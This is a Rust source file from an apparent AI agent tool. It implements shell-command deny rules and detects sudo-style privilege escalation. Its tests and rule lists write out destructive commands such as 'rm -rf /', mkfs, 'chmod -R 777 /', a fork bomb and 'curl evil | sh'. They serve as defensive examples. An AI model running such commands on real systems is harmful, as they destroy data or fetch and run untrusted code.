//! Command deny rules.
//!
//! A rule matches a shell command when any segment of it matches, where a
//! segment is what is left after splitting on `;`, `|`, `&`, newlines, and the
//! brackets a subshell or a group is written with, and after dropping the words
//! that stand in front of a command without being one — `sudo`, `env`, `nohup`,
//! `time`, a `VAR=value`, a redirection.
//!
//! A segment matches a rule two ways, either of which is enough:
//!
//! * **As text.** The segment, normalised, equals the rule or starts with it
//!   followed by a space; a rule ending in `*` matches any continuation. This
//!   is what `mkfs*` and `dd if=*` are for.
//! * **As a command.** The program is the same, every flag the rule names is
//!   present however it is spelled or grouped, and the rule's operands are the
//!   segment's first operands. This is what makes `rm -r -f /` and
//!   `chmod 777 -R /` the same commands as `rm -rf /` and `chmod -R 777 /`.
//!
//! This reads a shell command without a shell. It is a guard against the
//! ordinary case and not a sandbox: a command assembled at run time —
//! `sh -c "$(…)"`, a script written and then run, a `build.rs` — is not in the
//! text at all, and nothing here can see it.

/// Characters a shell reads as the end of one command and the start of
/// another. A rule containing one of these can never match a segment, because
/// the segment was split at it.
pub const SEPARATORS: [char; 10] = ['\n', ';', '|', '&', '(', ')', '{', '}', '`', '\r'];

/// Words written where a command goes that hand the position to the next word.
const WRAPPERS: [&str; 12] = [
    "env", "nohup", "time", "command", "exec", "setsid", "xargs", "nice", "ionice", "timeout",
    "stdbuf", "eval",
];

/// Programs that take somebody else's privileges, and ask for a password at a
/// terminal to do it.
///
/// The asking is what matters. A password prompt goes to whatever terminal the
/// agent was started from, so in a session nobody is sitting in front of — one
/// the daemon started for a phone — the command does not fail, it waits, and
/// keeps waiting until the tool times out with nothing to show for it.
///
/// They also stand in front of a command the way a wrapper does, so for the
/// purpose of reading what the command *is* they are stepped over; whether one
/// may run at all is `escalates`.
const ESCALATORS: [&str; 6] = ["sudo", "doas", "pkexec", "su", "sudoedit", "run0"];

/// Long spellings of a short flag, for the programs the built-in rules name.
///
/// Without these, `rm --recursive --force /` and `rm -rf /` are two different
/// commands to anything comparing flags, which is how a rule that names one
/// misses the other.
const FLAG_ALIASES: &[(&str, &str, &str)] = &[
    ("rm", "--recursive", "-r"),
    ("rm", "-R", "-r"),
    ("rm", "--force", "-f"),
    ("rm", "--dir", "-d"),
    ("chmod", "--recursive", "-R"),
    ("chown", "--recursive", "-R"),
    ("cp", "--recursive", "-r"),
    ("cp", "-R", "-r"),
];

/// One segment, read as far as a program, its flags and what it was given.
#[derive(Debug, Default, PartialEq)]
struct Piece {
    program: String,
    /// Short flags split out of their clusters and long flags as written, both
    /// put through `FLAG_ALIASES`. Order is not kept: `-r -f` and `-fr` are
    /// the same two flags.
    flags: Vec<String>,
    operands: Vec<String>,
}

/// Strip the quotes a shell would take off, and the marks that say "the real
/// program" rather than an alias or a builtin.
fn bare(word: &str) -> String {
    word.chars().filter(|c| *c != '"' && *c != '\'').collect()
}

/// Whether a word written in command position hands that position along.
fn passes_along(word: &str) -> bool {
    if word.is_empty() {
        return true;
    }
    // Asked before the path is trimmed, because `>/dev/null` trimmed to its
    // last part is `null`, which looks like a program.
    if word.contains('>') || word.contains('<') {
        return true;
    }
    let head = word.trim_start_matches(['\\', '^']);
    let head = head.rsplit('/').next().unwrap_or(head);
    WRAPPERS.contains(&head)
        || ESCALATORS.contains(&head)
        || head.starts_with('-')
        // `timeout 5 sudo id`: a bare number only ever reaches here as a
        // wrapper's argument.
        || head.chars().all(|c| c.is_ascii_digit() || c == '.')
        || (head.contains('=') && !head.starts_with('-'))
}

/// Split a word written as flags into the flags it names.
///
/// `-rf` is two flags. `--force` is one. `-n10` is `-n` with its argument
/// attached, which is the flag `-n`; the number is not a flag of its own.
fn flags_of(program: &str, word: &str) -> Vec<String> {
    let alias = |f: String| -> String {
        FLAG_ALIASES
            .iter()
            .find(|(p, long, _)| *p == program && *long == f)
            .map(|(_, _, short)| (*short).to_string())
            .unwrap_or(f)
    };
    if let Some(long) = word.strip_prefix("--") {
        // `--depth=1` is the flag `--depth`.
        let name = long.split('=').next().unwrap_or(long);
        return vec![alias(format!("--{name}"))];
    }
    let short = word.trim_start_matches('-');
    let mut out = Vec::new();
    for c in short.chars() {
        if c.is_ascii_alphabetic() {
            out.push(alias(format!("-{c}")));
        } else {
            // A digit or anything else ends the cluster: what follows is the
            // previous flag's argument, not another flag.
            break;
        }
    }
    out
}

/// Read one already-split segment.
fn read(segment: &str) -> Piece {
    let mut words = segment.split_whitespace().map(bare).peekable();
    let mut program = String::new();
    for w in words.by_ref() {
        if passes_along(&w) {
            continue;
        }
        let head = w.trim_start_matches(['\\', '^']);
        program = head.rsplit('/').next().unwrap_or(head).to_string();
        break;
    }
    let mut piece = Piece {
        program,
        ..Default::default()
    };
    for w in words {
        if w.starts_with('-') && w.len() > 1 {
            piece.flags.extend(flags_of(&piece.program, &w));
        } else {
            piece.operands.push(w);
        }
    }
    piece
}

/// Segments of `command`: the text of each, normalised the way `read` reads it,
/// so that a rule written as text is compared against the same spelling every
/// time.
pub fn segments(command: &str) -> Vec<String> {
    command
        .split(SEPARATORS)
        .map(|s| {
            let p = read(s);
            if p.program.is_empty() {
                return String::new();
            }
            let mut out = vec![p.program];
            // Flags and operands in the order they were written, so the text
            // form still reads like the command somebody typed. The order-free
            // comparison is `matches_as_command`.
            let mut rest: Vec<String> = s
                .split_whitespace()
                .map(bare)
                .skip_while(|w| passes_along(w))
                .skip(1)
                .collect();
            out.append(&mut rest);
            out.join(" ")
        })
        .filter(|s| !s.is_empty())
        .collect()
}

/// The two kinds of match, either of which refuses the segment.
fn rule_matches(rule: &str, segment: &str) -> bool {
    let rule_text: String = rule.split_whitespace().collect::<Vec<_>>().join(" ");
    // A `*` written against the end of a word says "and anything after this":
    // `mkfs*` is every `mkfs.<something>`, `dd if=*` is any input file. A `*`
    // standing on its own as a word is the word `*`, which is what somebody
    // means by `rm -rf *` — the shell's own everything-here. Telling the two
    // apart by the space is the only way to have both.
    if let Some(prefix) = rule_text.strip_suffix('*')
        && !prefix.ends_with(' ')
        && !prefix.is_empty()
    {
        return segment.starts_with(prefix);
    }
    if segment == rule_text || segment.starts_with(&format!("{rule_text} ")) {
        return true;
    }
    matches_as_command(&rule_text, segment)
}

/// Whether `segment` is the same command the rule names, however its flags are
/// spelled, grouped or ordered.
///
/// The program has to be the same one, every flag the rule names has to be
/// there, and what the rule was given has to be what the segment was given
/// first. `rm -rf /` therefore covers `rm -r -f /`, `rm -fr /`,
/// `rm --recursive --force /` and `rm -rf / --no-preserve-root`, and does not
/// cover `rm -rf /tmp/build` — a different thing was asked for.
fn matches_as_command(rule: &str, segment: &str) -> bool {
    let r = read(rule);
    if r.program.is_empty() {
        return false;
    }
    let s = read(segment);
    if r.program != s.program {
        return false;
    }
    if !r.flags.iter().all(|f| s.flags.contains(f)) {
        return false;
    }
    r.operands.len() <= s.operands.len() && r.operands == s.operands[..r.operands.len()]
}

/// Why a rule can never match anything, if that is so.
///
/// Worth saying out loud at load: a rule with a `;` or a `|` in it looks like
/// protection and is not, because the command was split at that character
/// before any rule was compared with it.
pub fn unmatchable(rule: &str) -> Option<String> {
    let bad: Vec<String> = SEPARATORS
        .iter()
        .filter(|c| rule.contains(**c))
        .map(|c| format!("`{}`", c.escape_debug()))
        .collect();
    if bad.is_empty() {
        return None;
    }
    Some(format!(
        "the rule `{rule}` can never match: a command is split at {} before any rule is \
         compared with it, so no piece of one ever contains {}",
        bad.join(", "),
        if bad.len() == 1 { "it" } else { "them" }
    ))
}

/// Every deny rule in force: the built-in list unless `deny_replace` says
/// otherwise, plus what `deny` and `deny_extra` name, minus what `deny_remove`
/// names, minus any rule that could never match.
///
/// Adding a rule is the thing people do to this setting, and a merge patch
/// replaces an array — so `deny = ["curl *"]`, written to add one rule, used
/// to silently throw away the thirty that were there. It adds now.
pub fn rules(p: &ah_abi::Permissions) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    if !p.deny_replace {
        out.extend(ah_abi::DEFAULT_DENY.iter().map(|s| String::from(*s)));
    }
    for r in p.deny.iter().chain(p.deny_extra.iter()) {
        if !out.contains(r) {
            out.push(r.clone());
        }
    }
    out.retain(|r| !p.deny_remove.contains(r) && unmatchable(r).is_none());
    out
}

/// What is wrong with the deny rules as written, in one line each.
///
/// Said out loud rather than quietly dropped: a rule that cannot match reads
/// as protection, and finding out it never worked after the fact is the worst
/// way to find out.
pub fn complaints(p: &ah_abi::Permissions) -> Vec<String> {
    let mut out = Vec::new();
    for r in p.deny.iter().chain(p.deny_extra.iter()) {
        if let Some(why) = unmatchable(r) {
            out.push(why);
        }
    }
    for r in &p.deny_remove {
        if !ah_abi::DEFAULT_DENY.contains(&r.as_str()) && !p.deny.contains(r) {
            out.push(format!(
                "permissions.deny_remove names `{r}`, which is not a rule that was there"
            ));
        }
    }
    out
}

/// The first rule that matches `command`, if any.
pub fn denied<'a>(command: &str, rules: &'a [String]) -> Option<&'a str> {
    let segs = segments(command);
    rules
        .iter()
        .find(|r| segs.iter().any(|s| rule_matches(r, s)))
        .map(String::as_str)
}

/// True when every segment of `command` matches one of `rules` and the command
/// neither redirects nor substitutes, which is as close to "reads only" as a
/// shell command can be judged without running it.
pub fn read_only(command: &str, rules: &[String]) -> bool {
    if command.contains('>') || command.contains('`') || command.contains("$(") {
        return false;
    }
    let segs = segments(command);
    !segs.is_empty()
        && segs
            .iter()
            .all(|s| rules.iter().any(|r| rule_matches(r, s)))
}

/// The first privilege escalation `command` would run, if any.
///
/// Only words in command position count, so `grep sudo /etc/group` is a search
/// and `sudo apt update` is not. A command substitution counts as a position of
/// its own, because it is one. This reads a shell command without a shell, so
/// it is a guard against the ordinary case and not a sandbox: something built
/// to get past it, `sh -c` with the name in a string, will.
pub fn escalates(command: &str) -> Option<&'static str> {
    let mut found = None;
    let mut at_start = true;
    let mut word = String::new();
    // The extra newline closes whatever word the command ends on.
    for ch in command.chars().chain(core::iter::once('\n')) {
        let breaks = matches!(ch, ';' | '&' | '|' | '\n' | '(' | ')' | '{' | '}' | '`');
        if !breaks && !ch.is_whitespace() {
            if ch != '"' && ch != '\'' {
                word.push(ch);
            }
            continue;
        }
        if !word.is_empty() && at_start {
            // A leading backslash is how an alias is stepped around, `^` is
            // how nushell says "the real program", and a full path is the same
            // program by a longer name.
            let head = word.trim_start_matches(['\\', '^']);
            // A redirection is written where a command goes and is not one:
            // `2>&1 sudo id` and `>/dev/null sudo id` both run sudo. Asked
            // before the path is trimmed, because `>/dev/null` trimmed to its
            // last segment is `null`, which looks like a program.
            let redirect = head.contains('>') || head.contains('<');
            let head = head.rsplit('/').next().unwrap_or(head);
            // `timeout 5 sudo id` is why a bare number passes along too: it
            // only ever reaches here as a wrapper's argument.
            let passes_along = WRAPPERS.contains(&head)
                || head.starts_with('-')
                || redirect
                || head.chars().all(|c| c.is_ascii_digit() || c == '.')
                || (head.contains('=') && !head.starts_with('-'));
            if !passes_along {
                if let Some(name) = ESCALATORS.iter().find(|e| **e == head) {
                    found = Some(*name);
                    break;
                }
                at_start = false;
            }
        }
        word.clear();
        if breaks {
            at_start = true;
        }
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn matches_segments_and_boundaries() {
        let rules: Vec<String> = ["git reset --hard", "rm -rf /", "git push --force", "mkfs*"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(
            denied("git reset --hard HEAD~1", &rules),
            Some("git reset --hard")
        );
        assert_eq!(denied("cd x && sudo rm -rf /", &rules), Some("rm -rf /"));
        assert_eq!(denied("rm -rf /tmp/build", &rules), None);
        assert_eq!(denied("git push --force-with-lease", &rules), None);
        assert_eq!(denied("mkfs.ext4 /dev/sdb", &rules), Some("mkfs*"));
        assert_eq!(denied("git reset --soft HEAD~1", &rules), None);
    }

    #[test]
    fn the_same_command_spelled_another_way_is_the_same_command() {
        let rules: Vec<String> = [
            "rm -rf /",
            "git push --force",
            "chmod -R 777 /",
            "git reset --hard",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        for cmd in [
            "rm -r -f /",
            "rm -f -r /",
            "rm -fr /",
            "rm --recursive --force /",
            "rm -rf '/'",
            "rm -rf -- /",
            "command rm -rf /",
            "exec rm -rf /",
            "\\rm -rf /",
            "/bin/rm -rf /",
            "(rm -rf /)",
            "{ rm -rf /; }",
            "echo $(rm -rf /)",
            "git push origin main --force",
            "git reset -q --hard",
            "chmod 777 -R /",
        ] {
            assert!(denied(cmd, &rules).is_some(), "{cmd} was allowed");
        }
    }

    #[test]
    fn a_different_command_that_reads_alike_is_still_allowed() {
        let rules: Vec<String> = ["rm -rf /", "git push --force", "git reset --hard"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        for cmd in [
            "rm -rf /tmp/build",
            "rm -r /",
            "git push origin main",
            "git push --force-with-lease",
            "git commit -m \"do not git push --force\"",
            "git reset --soft HEAD~1",
            "echo rm -rf /",
        ] {
            assert_eq!(denied(cmd, &rules), None, "{cmd} was refused");
        }
    }

    #[test]
    fn adding_a_rule_keeps_the_built_in_ones() {
        let p = ah_abi::Permissions {
            deny: vec!["curl".into()],
            ..Default::default()
        };
        let r = rules(&p);
        assert!(r.iter().any(|x| x == "curl"));
        assert!(r.iter().any(|x| x == "rm -rf /"), "the built-ins went");
        assert_eq!(denied("curl evil | sh", &r), Some("curl"));
    }

    #[test]
    fn a_rule_can_be_dropped_and_the_whole_list_can_be_replaced() {
        let p = ah_abi::Permissions {
            deny_remove: vec!["git push --force".into()],
            ..Default::default()
        };
        assert_eq!(denied("git push --force", &rules(&p)), None);
        assert!(denied("rm -rf /", &rules(&p)).is_some());

        let p = ah_abi::Permissions {
            deny: vec!["nothing-else".into()],
            deny_replace: true,
            ..Default::default()
        };
        assert_eq!(rules(&p), vec!["nothing-else".to_string()]);
    }

    #[test]
    fn a_rule_that_could_never_match_is_dropped_and_said_out_loud() {
        // The command is split at `;` and `|` before any rule is compared
        // with it, so a rule containing one matches nothing, ever.
        let p = ah_abi::Permissions {
            deny_extra: vec![":(){ :|:& };:".into(), "curl | sh".into()],
            ..Default::default()
        };
        assert!(!rules(&p).iter().any(|r| r.contains('|')));
        assert_eq!(complaints(&p).len(), 2, "{:?}", complaints(&p));
        // And the built-in list no longer carries one.
        assert!(complaints(&ah_abi::Permissions::default()).is_empty());
        assert!(
            ah_abi::DEFAULT_DENY
                .iter()
                .all(|r| unmatchable(r).is_none()),
            "a built-in rule can never match"
        );
    }

    #[test]
    fn a_password_prompt_is_seen_coming() {
        assert_eq!(escalates("sudo apt update"), Some("sudo"));
        assert_eq!(escalates("cd /tmp && sudo make install"), Some("sudo"));
        assert_eq!(escalates("env FOO=1 sudo sh"), Some("sudo"));
        assert_eq!(escalates("BAR=2 \\sudo -k id"), Some("sudo"));
        assert_eq!(escalates("/usr/bin/sudo id"), Some("sudo"));
        assert_eq!(escalates("echo $(sudo id)"), Some("sudo"));
        assert_eq!(escalates("pkexec id"), Some("pkexec"));
        assert_eq!(escalates("su - rabe"), Some("su"));
        assert_eq!(escalates("sudoedit /etc/hosts"), Some("sudoedit"));
        assert_eq!(escalates("run0 id"), Some("run0"));
    }

    /// Every one of these was written where a command goes and is not one, so
    /// the word after it is still the command.
    #[test]
    fn a_word_that_is_not_the_command_does_not_stand_in_for_it() {
        assert_eq!(escalates("2>&1 sudo id"), Some("sudo"));
        assert_eq!(escalates(">/dev/null sudo id"), Some("sudo"));
        assert_eq!(escalates("<input sudo id"), Some("sudo"));
        // nushell spells "the real program, not a builtin" with a caret, and
        // an empty `tools.shell` means whatever $SHELL is.
        assert_eq!(escalates("^sudo id"), Some("sudo"));
        // Wrappers that take an argument of their own.
        assert_eq!(escalates("timeout 5 sudo id"), Some("sudo"));
        assert_eq!(escalates("nice -n 10 sudo id"), Some("sudo"));
        assert_eq!(escalates("xargs sudo rm"), Some("sudo"));
        assert_eq!(escalates("eval sudo id"), Some("sudo"));
    }

    #[test]
    fn the_word_somewhere_else_in_a_command_is_just_a_word() {
        // Every one of these is somebody reading about sudo, not running it.
        assert_eq!(escalates("grep -rn sudo /etc/group"), None);
        assert_eq!(escalates("man sudo"), None);
        assert_eq!(escalates("git commit -m \"say why sudo is refused\""), None);
        assert_eq!(escalates("ls -l /usr/bin/sudo"), None);
        assert_eq!(escalates("cat /etc/sudoers"), None);
        assert_eq!(escalates("apt-get install -y sudo"), None);
        assert_eq!(escalates(""), None);
        // And a program whose name merely begins the same way.
        assert_eq!(escalates("superimpose a.png b.png"), None);
        assert_eq!(escalates("sudoku --solve puzzle.txt"), None);
    }

    #[test]
    fn read_only_needs_every_segment() {
        let rules: Vec<String> = ["rg", "git log", "wc"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert!(read_only("rg -n todo src | wc -l", &rules));
        assert!(read_only("git log --oneline -5", &rules));
        assert!(!read_only("rg -n todo > out.txt", &rules));
        assert!(!read_only("rg -n $(cat f)", &rules));
        assert!(!read_only("rg -n todo && rm -rf x", &rules));
        assert!(!read_only("git commit -m x", &rules));
        assert!(!read_only("", &rules));
    }
}
